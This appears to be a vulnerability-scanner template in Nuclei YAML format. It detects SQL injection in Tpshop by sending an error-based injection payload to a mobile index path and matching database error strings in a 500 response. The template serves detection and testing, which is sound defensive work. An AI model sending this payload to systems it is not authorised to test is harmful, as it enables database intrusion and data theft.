id: tpshop-sqli
info:
  name: Tpshop SQL Injection
  author: ProjectDiscoveryAI
  severity: medium
  tags: sql-injection
  description: |
    This template identifies an SQL injection vulnerability in Tpshop by leveraging a crafted payload that triggers SQL errors in the response.

variables:
  r: "{{md5(rand_int(10000, 21000))}}"

http:
  - method: GET
    path:
      - "/mobile/index/index2/id/1) and (select 1 from (select count(*),concat(0x716b627671,{{r}},0x716b627671,floor(rand(0)*2))x from information_schema.tables group by x)a)--"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{r}}"
          - "PDOException"
          - "SQLSTATE"
      - type: status
        status:
          - 500
